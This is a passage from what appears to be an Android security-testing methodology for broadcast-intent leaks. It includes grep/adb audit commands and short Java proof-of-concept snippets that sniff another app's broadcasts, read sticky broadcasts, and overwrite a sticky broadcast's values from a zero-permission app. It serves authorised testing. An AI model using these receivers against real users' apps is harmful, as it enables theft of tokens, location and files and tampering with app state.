  or calls `setPackage(context.getPackageName())`, or is `LocalBroadcastManager.sendBroadcast` — verified
  per call site, not per file. A sends inventory with a permission/`setPackage` column is the deliverable
  that closes this.

### D05-031 · The whole-API-response broadcast

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | Apps using a broadcast bus for intra-app network plumbing. |
| **Maps to** | H1 #56002 (Shopify — network layer broadcast every API response; `access_token` and `admin_cookie` captured by an app declaring no permissions, "No special permission or root required. No user interactions and awareness."); CWE-927 |

- **Test:** A specific, high-value instance of D05-030: the app's network layer broadcasts a
  request-complete event carrying the **entire response body**. One action string leaks everything the app
  ever fetches, including auth material, for the lifetime of the session.
- **How:**
```bash
grep -rn 'sendBroadcast(' out/sources/ -B10 | grep -iE 'new Intent\(|requestComplete|onResponse|Response|Interceptor'
grep -rn 'LocalBroadcastManager' out/sources/     # its ABSENCE next to network code is the tell
adb shell dumpsys activity broadcasts | grep -i com.target
```
  Register for the discovered action from the zero-permission APK, exercise the app's login and a couple of
  authenticated screens, and dump every extra.
- **Proof:** Your sniffer's log showing `access_token` / `Set-Cookie` / a full JSON profile body, keyed to
  the screen you were driving at the time. Then the replay 200.
- **Escalation:** → D15 as the victim; and the captured endpoint list is itself the input to the shadow-API
  hunt (the mobile client's hardcoded routes are frequently an older API version than the web app uses —
  diff behaviourally, not by response shape).
- **Ruled out when:** The response bus is `LocalBroadcastManager`, an in-process `LiveData`/`Flow`, or a
  `sendBroadcast` with `setPackage(self)`. Confirm by registering the action from your PoC app and
  observing nothing while the same action fires in-process under a Frida hook — that pairing is the proof.

### D05-032 · Location, file-event and upload broadcasts — the permission-bypass framing

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null, CWE-200) / `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | H1 #185862 (Twitter, Low, $560 — `com.twitter.library.geo.LOCATION_CHANGED` carrying a `Location` extra); H1 #167481 (Nextcloud, accepted — `FileUploader.UPLOAD_START` / `UPLOAD_FINISH` / `UPLOADS_ADDED`); H1 #192886 (Mapbox, Low, $1000) |

- **Test:** Same primitive as D05-030 with a lower-value payload, and it still pays — but only when framed
  as a **permission bypass**, not as data disclosure. The report sentence is "an app holding no location
  permission obtains the user's precise coordinates", not "the app broadcasts location".
- **How:** Attacker receiver registered at runtime for the app's event actions:
```java
IntentFilter f = new IntentFilter();
f.addAction("com.target.app.geo.LOCATION_CHANGED");
f.addAction("FileUploader.UPLOAD_START");
f.addAction("FileUploader.UPLOAD_FINISH");
f.setPriority(999);
registerReceiver(sniffer, f, Context.RECEIVER_EXPORTED);
```
- **Proof:** GPS coordinates, the victim's account name, or file paths appearing in your log from an app
  with **no** location and **no** storage permission — with the `requested permissions` dumpsys block of
  your PoC in the same evidence set.
- **Escalation:** → D03 (permission re-delegation framing) and D20 (privacy). A leaked file path feeds D07
  file theft.
- **Ruled out when:** The broadcast carries only an opaque identifier that is useless outside the app's own
  process (an internal row id with no resolvable provider), or it is package-targeted. State what the
  extras actually contained.

### D05-033 · `LocalBroadcastManager` removal regression

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — enabler; the finding it surfaces is D05-030 |
| **Attacker** | AM-03 |
| **Applies to** | All. `LocalBroadcastManager` is deprecated; Google points developers to `LiveData` and observable holders. |
| **Maps to** | MASTG-KNOW-0134, MASTG-TEST-0374 |

- **Test:** `LocalBroadcastManager` in the codebase means the developer *knew* that traffic was internal.
  The bug is what happened during the migration away from it: a mechanical replacement of
  `LocalBroadcastManager.getInstance(ctx).sendBroadcast(i)` with `ctx.sendBroadcast(i)` silently promotes an
  in-process message to a device-wide one. Diff against the previous release to catch it.
- **How:**
```bash
grep -rn 'LocalBroadcastManager' out/sources/ | wc -l
# pull an older release and compare the two call-site sets
grep -rn 'sendBroadcast(' old/sources/ > /tmp/old.txt
grep -rn 'sendBroadcast(' out/sources/ > /tmp/new.txt
diff <(sed 's/^[^:]*://' /tmp/old.txt | sort -u) <(sed 's/^[^:]*://' /tmp/new.txt | sort -u)
```
- **Proof:** A call site that was `LocalBroadcastManager.sendBroadcast` in build N-1 and is `Context.sendBroadcast`
  in build N, with the same extras — and your PoC receiver capturing them on the current build.
- **Escalation:** Straight into D05-030 with the version history as supporting evidence that this was a
  regression, not a design.
- **Ruled out when:** Every former `LocalBroadcastManager` call site migrated to an in-process observable
  (`LiveData`, `StateFlow`, `EventBus`) or to `sendBroadcast` with `setPackage(self)`.

### D05-034 · Sticky broadcast read — `registerReceiver(null, filter)` (LEGACY)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** `sendStickyBroadcast` deprecated at API 21; `BROADCAST_STICKY` is no longer grantable to normal third-party apps on recent releases. Treat as an OEM / preinstalled / low-`minSdk` check. |
| **Maps to** | MASTG-KNOW-0134 ("Sticky broadcasts ... persist after delivery and offer no access control"), MASTG-TEST-0374; `developer.android.com/privacy-and-security/risks/sticky-broadcast`; QARK/MobSF `STICKY_BROADCAST` |

- **Test:** A sticky broadcast persists **with its extras** in `ActivityManager` and is delivered to any app
  that registers a matching filter, including one installed long afterwards. The read is a one-liner and
  needs no receiver at all.
- **How:**
```bash
grep -rn 'sendStickyBroadcast\|sendStickyOrderedBroadcast\|removeStickyBroadcast\|StickyBroadcastAsUser' out/sources/ out/smali/
grep -n 'BROADCAST_STICKY' out/AndroidManifest.xml
adb shell dumpsys activity broadcasts | sed -n '/Sticky broadcasts/,/^$/p'
```
  Attacker read, from a zero-permission app:
```java
Intent stuck = registerReceiver(null, new IntentFilter("com.target.app.STATE"));
Log.e("PoC", String.valueOf(stuck != null ? stuck.getExtras() : null));
```
- **Proof:** `registerReceiver(null, filter)` returning a non-null Intent whose extras contain the victim's
  values, logged under your package — or the `dumpsys` sticky dump printing them.
- **Escalation:** Extras carrying identifiers → D20 privacy; a token → D05-030's chain.
- **Ruled out when:** No `sendSticky*` call exists in the current build, **or** the calls exist but the
  platform under test refuses them (`BROADCAST_STICKY` not grantable) — run the read and record the null
  return as the evidence. It is a one-line grep, so always run it; expect nothing on a modern target.

### D05-035 · Sticky broadcast overwrite, and `setPackage()` being ignored on re-broadcast (LEGACY)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY**, same gate as D05-034. |
| **Maps to** | `developer.android.com/privacy-and-security/risks/sticky-broadcast` (sticky re-broadcasts ignore `setPackage()`; `BROADCAST_STICKY` is granted automatically at install; a new sticky with the same action/data/type/identifier/class/categories **replaces** the previous one) |

- **Test:** Three documented defects, of which only the first is commonly tested. The second and third make
  this a **tampering** primitive, not just a leak: the cached sticky ignores `setPackage()` on re-delivery,
  and any app can replace the cached entry so that every legitimate receiver later reads attacker values.
- **How:**
```java
// overwrite: same action/data/type/identifier/class/categories replaces the cached entry
sendStickyBroadcast(new Intent("com.target.app.STATE").putExtra("balance", 0)
                                                      .putExtra("marker", "zq7x4mk9"));
```
```bash
adb shell dumpsys activity broadcasts | sed -n '/Sticky broadcasts/,/^$/p' | grep zq7x4mk9
```
- **Proof:** The `dumpsys` sticky cache showing your replacement Intent under the victim's action, then the
  victim app consuming your value — observable in its UI or its logs.
- **Escalation:** Injecting a hostile configuration or URL into a sticky the app later trusts → D10/D14.
  With `sendStickyOrderedBroadcast`, a higher-priority attacker receiver can also `setResultData()` or
  `abortBroadcast()` (D05-037, D05-038).
- **Ruled out when:** The platform refuses your `sendStickyBroadcast` (`SecurityException` naming
  `BROADCAST_STICKY`) — paste it — or the app consumes no sticky broadcast at all.
